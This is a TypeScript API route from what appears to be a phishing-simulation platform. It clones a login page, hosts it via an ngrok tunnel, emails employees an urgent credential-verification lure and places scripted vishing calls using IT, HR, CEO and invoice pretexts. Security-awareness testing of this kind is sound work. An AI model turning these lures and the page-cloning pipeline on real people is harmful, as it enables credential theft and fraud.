import { NextRequest, NextResponse } from "next/server";
import { getCampaign, updateCampaign } from "@/lib/models/campaign";
import { createInteraction } from "@/lib/models/interaction";
import { createLog } from "@/lib/models/log";
import { capturePage } from "@/lib/capture/singlefile";
import { modifyHtml } from "@/lib/capture/html-modifier";
import { startLandingServer } from "@/lib/landing-server";
import { startTunnel } from "@/lib/tunnel/ngrok";
import { generateContent } from "@/lib/ai/gemini";
import { phishingEmailPrompt } from "@/lib/ai/prompts";
import { sendPhishingEmail } from "@/lib/delivery/email";
import { getEmployee } from "@/lib/models/employee";

/**
 * Generate dynamic VAPI script based on attack scenario
 */
function generateVapiScript(scenario: string, companyName: string, isFollowUp: boolean): string {
  const company = companyName || 'IT';

  // If it's a follow-up call (email was sent first)
  if (isFollowUp) {
    return `Hello, this is ${company} Security Department calling.

We sent you an urgent email that requires your immediate attention.

For security purposes, we need you to verify your account credentials by clicking the link in the email we just sent.

This is a time-sensitive security matter. Please complete the verification within the next hour to avoid account suspension.

If you haven't received the email, please check your spam folder or contact our help desk.

Thank you for your cooperation in keeping our systems secure.`;
  }

  // Generate script based on scenario type
  const scenarioLower = scenario.toLowerCase();

  if (scenarioLower.includes('password') || scenarioLower.includes('reset')) {
    return `Hello, this is ${company} IT Security calling.

We've detected a security issue with your account password and need to reset it immediately.

For your security, please visit our secure portal to complete the password reset process.

This is urgent - your account will be locked in 30 minutes if the reset is not completed.

Thank you for your immediate attention to this matter.`;
  }

  if (scenarioLower.includes('hr') || scenarioLower.includes('benefits')) {
    return `Hello, this is ${company} Human Resources calling.

We have an urgent update regarding your benefits enrollment that requires your attention.

Please log in to our employee portal to review and confirm your information before the deadline.

This needs to be completed by end of day today to avoid losing your benefits coverage.

Thank you for taking care of this promptly.`;
  }

  if (scenarioLower.includes('executive') || scenarioLower.includes('ceo') || scenarioLower.includes('c-level')) {
    return `Hello, this is calling on behalf of our executive team.

We have an urgent request from the CEO that requires your immediate assistance.

Please access the secure link we're providing to complete a time-sensitive task.

This matter is confidential and needs to be handled within the next hour.

Thank you for your discretion and quick response.`;
  }

  if (scenarioLower.includes('vendor') || scenarioLower.includes('invoice') || scenarioLower.includes('payment')) {
    return `Hello, this is ${company} Accounts Payable calling.

We have a vendor invoice that requires your verification before we can process payment.

Please review the invoice details through our secure portal at your earliest convenience.

The vendor is requesting urgent payment, so we need your approval today.

Thank you for your quick attention to this matter.`;
  }

  if (scenarioLower.includes('security') || scenarioLower.includes('alert') || scenarioLower.includes('breach')) {
    return `Hello, this is ${company} Security Operations calling.

We've detected unusual activity on your account that requires immediate verification.

For your protection, please visit our secure portal to verify your identity and review the activity.

This is a critical security matter - your account will be temporarily suspended if not addressed within one hour.

Thank you for your cooperation in keeping our systems secure.`;
  }

  // Default / Custom scenario
  return `Hello, this is ${company} Security Department calling.

We have an important matter that requires your immediate attention.

Please access our secure portal to review and take the necessary action.

This is time-sensitive and needs to be addressed within the next hour.

Thank you for your prompt attention to this matter.`;
}

export async function POST(
  _req: NextRequest,
  { params }: { params: Promise<{ id: string }> }
) {
  const { id } = await params;

  try {
    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
    console.log(`[Campaign ${id}] 🚀 LAUNCH INITIATED`);
    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');

    const campaign = await getCampaign(id);
    console.log(`[Campaign ${id}] 📋 Current status: ${campaign.status}`);

    if (campaign.status !== "draft" && campaign.status !== "ready") {
      return NextResponse.json(
        { error: `Campaign cannot be launched from status: ${campaign.status}` },
        { status: 400 }
      );
    }

    const appUrl = process.env.NEXT_PUBLIC_APP_URL || "http://localhost:3000";

    const deliveryMethod = campaign.delivery_method || "email";
    const needsEmail = deliveryMethod === "email" || deliveryMethod === "both";
    const needsVapi = deliveryMethod === "vapi" || deliveryMethod === "both";

    console.log(`[Campaign ${id}] 📬 Delivery method: ${deliveryMethod}`);
    console.log(`[Campaign ${id}] ✉️  Needs email: ${needsEmail}`);
    console.log(`[Campaign ${id}] 📞 Needs VAPI: ${needsVapi}`);

    let htmlPath: string | undefined;
    let ngrokUrl: string | undefined;

    // Step 1: Capture the login page (only if email is needed)
    if (needsEmail) {
      console.log(`[Campaign ${id}] 🌐 Email delivery enabled - starting page capture...`);
      await updateCampaign(id, { status: "capturing" });
      await createLog({
        campaign_id: id,
        level: "info",
        action: "capture_start",
        message: `Capturing page: ${campaign.login_page_url}`,
      });

      const filename = `${id}.html`;
      console.log(`[Campaign ${id}] 📄 Capturing ${campaign.login_page_url}...`);
      htmlPath = await capturePage(campaign.login_page_url, filename);
      console.log(`[Campaign ${id}] ✅ Page captured: ${htmlPath}`);

      console.log(`[Campaign ${id}] 🔧 Modifying HTML...`);
      await modifyHtml(htmlPath, appUrl);
      console.log(`[Campaign ${id}] ✅ HTML modified`);

      // Step 2: Start landing server + ngrok tunnel
      console.log(`[Campaign ${id}] 🚀 Starting landing server...`);
      const { port } = await startLandingServer(htmlPath, appUrl);
      console.log(`[Campaign ${id}] ✅ Landing server started on port ${port}`);

      console.log(`[Campaign ${id}] 🌐 Starting ngrok tunnel...`);
      ngrokUrl = await startTunnel(port);
      console.log(`[Campaign ${id}] ✅ Ngrok tunnel: ${ngrokUrl}`);
    } else {
      console.log(`[Campaign ${id}] ⏭️  Skipping page capture (VAPI-only campaign)`);
    }

    await updateCampaign(id, {
      status: "generating",
      captured_html_path: htmlPath,
      ngrok_url: ngrokUrl,
    });

    // Step 3: Generate phishing email
    await createLog({
      campaign_id: id,
      level: "info",
      action: "generate_start",
      message: "Generating phishing email content",
    });

    // Create interactions for each target employee
    console.log(`[Campaign ${id}] 👥 Creating interactions for ${campaign.target_employee_ids.length} employees...`);
    const interactions = [];
    for (const employeeId of campaign.target_employee_ids) {
      const employee = await getEmployee(employeeId);
      console.log(`[Campaign ${id}]   • ${employee.name} (${employee.email}) - Phone: ${employee.phone || 'N/A'}`);
      const interaction = await createInteraction({
        campaign_id: id,
        employee_id: employeeId,
      });
      interactions.push(interaction);
    }
    console.log(`[Campaign ${id}] ✅ Created ${interactions.length} interactions`);

    // Use hardcoded template (bypass AI for now)
    const generatedEmail = {
      subject: "Urgent: Security Verification Required",
      body: `
        <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; background: #f5f5f5;">
          <div style="background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1);">
            <h2 style="color: #d32f2f; margin-top: 0;">Security Alert</h2>
            <p>Dear {{EMPLOYEE_NAME}},</p>
            <p>We've detected unusual activity on your account and need you to verify your login credentials immediately.</p>
            <p>This is part of our enhanced security measures to protect your account from unauthorized access.</p>
            <div style="margin: 30px 0; text-align: center;">
              <a href="{{TRACKING_URL}}" style="background: #1976d2; color: white; padding: 12px 30px; text-decoration: none; border-radius: 4px; display: inline-block; font-weight: bold;">
                Verify Account Now
              </a>
            </div>
            <p style="color: #666; font-size: 14px;">This verification link will expire in 24 hours.</p>
            <p style="color: #666; font-size: 14px;">If you did not request this verification, please contact IT support immediately.</p>
            <hr style="border: none; border-top: 1px solid #eee; margin: 20px 0;">
            <p style="color: #999; font-size: 12px; text-align: center;">
              ${campaign.company_name || 'IT Security Department'}<br>
              This is an automated security notification.
            </p>
          </div>
        </div>
      `,
    };

    await updateCampaign(id, {
      status: "delivering",
      generated_email: generatedEmail,
    });

    // Step 4: Send emails (if email delivery is enabled)
    if (needsEmail) {
      console.log(`[Campaign ${id}] 📧 Starting email delivery...`);
      await createLog({
        campaign_id: id,
        level: "info",
        action: "delivery_start",
        message: `Sending emails to ${interactions.length} employees`,
      });

      for (const interaction of interactions) {
        try {
          const employee = await getEmployee(interaction.employee_id);
          const trackingUrl = `${appUrl}/api/track/click?token=${interaction.tracking_token}`;
          const personalizedBody = generatedEmail.body
            .replace(/\{\{EMPLOYEE_NAME\}\}/g, employee.name)
            .replace(/\{\{TOKEN\}\}/g, interaction.tracking_token)
            .replace(/\{\{TRACKING_URL\}\}/g, trackingUrl);

          console.log(`[Campaign ${id}] 📧 Sending to ${employee.name} (${employee.email})...`);
          await sendPhishingEmail({
            to: employee.email,
            subject: generatedEmail.subject,
            html: personalizedBody,
          });
          console.log(`[Campaign ${id}] ✅ Email sent to ${employee.email}`);

          // Stagger sending by 2-5 seconds
          if (interactions.indexOf(interaction) < interactions.length - 1) {
            const delay = 2000 + Math.random() * 3000;
            console.log(`[Campaign ${id}] ⏳ Waiting ${Math.round(delay/1000)}s before next email...`);
            await new Promise((r) => setTimeout(r, delay));
          }
        } catch (error) {
          console.error(`[Campaign ${id}] ❌ Email failed to ${interaction.employee_id}:`, error);
          await createLog({
            campaign_id: id,
            level: "error",
            action: "delivery_failed",
            message: `Failed to send email to employee ${interaction.employee_id}: ${(error as Error).message}`,
          });
        }
      }
      console.log(`[Campaign ${id}] ✅ All emails sent`);
    } else {
      console.log(`[Campaign ${id}] ⏭️  Skipping email delivery (VAPI-only campaign)`);
    }

    // Step 4.5: Make VAPI calls if enabled (IMMEDIATE - no delay)
    if (needsVapi) {
      console.log(`[Campaign ${id}] 📞 Starting VAPI call sequence...`);
      console.log(`[Campaign ${id}] 🎭 Scenario: ${campaign.pretext_scenario}`);

      // Generate dynamic VAPI script based on attack scenario
      const vapiScript = generateVapiScript(
        campaign.pretext_scenario,
        campaign.company_name,
        deliveryMethod === "both"
      );

      await updateCampaign(id, {
        generated_vishing_script: vapiScript,
      });

      console.log(`[Campaign ${id}] 📝 Generated vishing script (${vapiScript.length} chars)`);
      console.log(`[Campaign ${id}] 👥 Processing ${interactions.length} employees for VAPI calls...`);

      const { makeVapiCall } = await import("@/lib/delivery/vapi");

      for (const interaction of interactions) {
        try {
          const employee = await getEmployee(interaction.employee_id);

          console.log(`[Campaign ${id}] 👤 Employee: ${employee.name} (${employee.email})`);
          console.log(`[Campaign ${id}] 📱 Phone: ${employee.phone || 'NOT SET'}`);

          if (!employee.phone) {
            console.warn(`[Campaign ${id}] ⚠️  Skipping ${employee.name} - no phone number`);
            await createLog({
              campaign_id: id,
              level: "warning",
              action: "vapi_skipped",
              message: `Skipped ${employee.name} - no phone number`,
              metadata: { employeeId: interaction.employee_id },
            });
            continue;
          }

          const result = await makeVapiCall({
            toNumber: employee.phone,
            script: vapiScript,
            employeeName: employee.name,
            companyName: campaign.company_name,
          });

          console.log(`[Campaign ${id}] ✅ Call initiated: ${result.callId}`);

          await createLog({
            campaign_id: id,
            level: "info",
            action: "vapi_call_initiated",
            message: `VAPI call initiated to ${employee.name} (${employee.phone})`,
            metadata: { callId: result.callId, employeeId: interaction.employee_id },
          });

          // Update interaction with vishing call ID
          const { supabase } = await import("@/lib/db");
          await supabase
            .from("interactions")
            .update({
              vishing_call_id: result.callId,
              updated_at: new Date().toISOString(),
            })
            .eq("id", interaction.id);

          // Stagger calls by 10-20 seconds
          if (interactions.indexOf(interaction) < interactions.length - 1) {
            const delay = 10000 + Math.random() * 10000;
            console.log(`[Campaign ${id}] ⏳ Waiting ${Math.round(delay/1000)}s before next call...`);
            await new Promise((r) => setTimeout(r, delay));
          }
        } catch (error) {
          console.error(`[Campaign ${id}] ❌ VAPI call failed for ${interaction.employee_id}:`, error);
          await createLog({
            campaign_id: id,
            level: "error",
            action: "vapi_failed",
            message: `VAPI call failed: ${(error as Error).message}`,
            metadata: {
              employeeId: interaction.employee_id,
              error: (error as Error).stack
            },
          });
        }
      }

      console.log(`[Campaign ${id}] 📞 All VAPI calls completed`);
    }

    // Step 5: Mark as active
    console.log(`[Campaign ${id}] ✅ Marking campaign as active...`);
    await updateCampaign(id, { status: "active" });
    await createLog({
      campaign_id: id,
      level: "info",
      action: "campaign_active",
      message: "Campaign is now active",
    });

    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
    console.log(`[Campaign ${id}] 🎉 LAUNCH SUCCESSFUL`);
    console.log(`[Campaign ${id}] 📧 Emails sent: ${needsEmail ? interactions.length : 0}`);
    console.log(`[Campaign ${id}] 📞 VAPI calls: ${needsVapi ? interactions.length : 0}`);
    if (ngrokUrl) console.log(`[Campaign ${id}] 🌐 Ngrok URL: ${ngrokUrl}`);
    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');

    return NextResponse.json({ success: true, ngrokUrl });
  } catch (error) {
    console.error('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
    console.error(`[Campaign ${id}] ❌ LAUNCH FAILED`);
    console.error(`[Campaign ${id}] Error:`, error);
    console.error('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
    await createLog({
      campaign_id: id,
      level: "error",
      action: "launch_failed",
      message: (error as Error).message,
      metadata: { stack: (error as Error).stack },
    });
    // Reset to draft on failure
    await updateCampaign(id, { status: "draft" });
    return NextResponse.json(
      { error: (error as Error).message },
      { status: 500 }
    );
  }
}
